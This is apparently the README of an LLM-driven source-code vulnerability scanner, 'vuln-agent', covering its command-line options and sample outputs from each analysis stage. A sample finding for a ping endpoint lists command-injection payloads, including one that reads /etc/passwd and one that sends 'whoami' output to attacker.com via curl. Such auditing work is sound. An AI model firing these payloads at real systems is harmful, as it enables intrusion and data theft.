# vuln-agent

基于 LLM 的多阶段源码分析工具，从源码发现攻击面、追踪数据流、识别潜在漏洞并二次验证。

## 前置条件

依赖 `nga` 或 `opencode` CLI。

## 快速开始

对一个目标代码目录运行完整分析管道：

```bash
python3 run.py /path/to/target
```

无参数时显示帮助信息：

```bash
python3 run.py
```

## 命令行参数

```bash
python3 run.py [work_dir] [选项]
```

| 参数 | 说明 |
|------|------|
| `work_dir` | 目标代码目录（默认当前目录） |
| `--collect-prompt TEXT` | 暴露面识别阶段追加提示词 |
| `--vuln-prompt TEXT` | 漏洞分析及二次审查阶段追加提示词 |
| `--thinking` | 显示 LLM 思考过程 |
| `--model MODEL` | 指定模型名称（如 `gpt-4`、`claude-sonnet-4`） |
| `--agent AGENT` | LLM 代理程序名称（`nga` 或 `opencode`），默认自动检测 |
| `--force-surface FILE` | 强制重新分析指定攻击面（逗号分隔，支持 `*` 通配），会清除已有产物 |
| `--test` | 测试 LLM 连通性（询问模型自身名称），不执行管道 |

### 示例

```bash
# 指定模型运行完整管道
python3 run.py /target --model gpt-4

# 暴露面识别阶段追加提示
python3 run.py /target --collect-prompt "重点关注登录后接口"

# 漏洞分析阶段追加提示
python3 run.py /target --vuln-prompt "优先分析命令注入和路径穿越"

# 测试 LLM 连通性
python3 run.py --test
python3 run.py --test --model gpt-4 --agent nga

# 指定代理程序
python3 run.py /target --agent opencode

# 显示 LLM 思考过程
python3 run.py /target --thinking

# 强制重新分析特定攻击面
python3 run.py /target --force-surface "iface-upload-*"
```

## 输出产物

```
_output/
├── surfaces/          # Stage 1: 攻击面记录，每文件一个条目
├── analysis/          # Stage 2: 攻击面深度分析（含流程图、数据流追踪）
├── vuln_tasks/        # Stage 2.5: 漏洞分析任务清单
├── vulnerabilities/   # Stage 3: 漏洞结论（VULN-/DISMISSED-/CLEAN-/SUSPECTED-）
├── vuln_review/       # Stage 4: 二次审查结论（VULN-/NOVULN-/SUSPECTED-）
└── meta/              # 排除路径记录、中间分析产物
```

## 配置

## 示例产物

`docs/` 目录包含各阶段产出的示例文件，内容如下：

### Stage 1: 攻击面识别 (`docs/surfaces/iface-REST-ping.md`)

```markdown
# 攻击面条目

- **类型**：iface
- **分类**：REST
- **来源**：src/main/java/.../PingController.java:18 ping()
- **描述**：接口健康检查，执行系统 ping 命令并返回结果
- **URL**：GET /ping
- **方法**：ping()
- **参数**：query: host (default: "8.8.8.8")
- **发现**：host 参数直接来源于用户 URL 查询参数，未经任何校验即传入后续 shell 命令执行流程
```

### Stage 2: 攻击面分析 (`docs/analysis/iface-REST-ping.md`)

分析产物的核心内容（已省略流程图等较长部分）：

```
GET /ping — 系统 ping 健康检查
来源：PingController.java:18    参数：query host (default: 8.8.8.8)

调用链：PingController → PingService → CommandExecutor → ScriptRunner
关键风险：ScriptRunner.java:17 拼接命令 cmd = scriptPath + " " + host
           ScriptRunner.java:18 Runtime.exec("/bin/sh", "-c", cmd)
校验状态：host 参数无 @Pattern / @Size / @NotNull 等注解式校验
```

### Stage 2.5: 漏洞分析任务 (`docs/vuln_tasks/iface-REST-ping-1.md`)

```markdown
# 命令注入 — GET /ping host 参数

**验证目标**：确认是否存在命令注入漏洞
**疑点位置**：
- PingController.java:24 — 接收 host 参数，无校验注解
- ScriptRunner.java:17-19 — 拼接命令字符串并执行
- ping.sh:2 — $1 未加引号

**疑点原因**：host 参数完全由 HTTP query 传入，外部可控，且无任何校验；
ScriptRunner 将 host 直接拼入 cmd，通过 /bin/sh -c 执行；
ping.sh 中 $1 未加引号。

**优先级**：高
```

### Stage 3: 漏洞结论 (`docs/vulnerabilities/VULN-iface-REST-ping-1-1.md`)

```
类型：命令注入    严重性：严重 (CVSS 9.8)
触发条件：GET /ping?host=<payload>
Payload：;id;   |   8.8.8.8;cat+/etc/passwd   |   8.8.8.8||curl+http://attacker.com/$(whoami)
调用链：host → Controller → Service → CommandExecutor → ScriptRunner → /bin/sh -c
事实依据：参数无校验、字符串拼接命令、shell 元字符无转义、$1 未加引号
```

### Stage 4: 二次审查 (`docs/vuln_review/VULN-VULN-iface-REST-ping-1-1.md`)

```
审查结论：有漏洞 ✅
审查理由：应用为完整独立系统（含 main 启动、无 Spring Security），
无外部网关补偿措施。证据链完整，CVSS 9.8 合理。
```

---

`config/analysis-config.yaml` 控制各阶段启用和并行度：

```yaml
max_workers: 3            # 并行线程数
attack_surface_collection: true
vulnerability_analysis: true
```

## 提示词日志

每次 LLM 调用的完整提示词保存在 `logs/prompts/` 目录下，按时间戳命名，可用于复现测试：

```
logs/prompts/20260601_120030_123_prompt.txt
```

## 基础设施

- `opencode_wrapper.py` — OpenCode CLI 的 Python 封装，提供隔离执行环境
- `llm-run.sh` — LLM 调用脚本，处理环境变量、thinking 模式等
- `test_llm.py` — 连通性测试
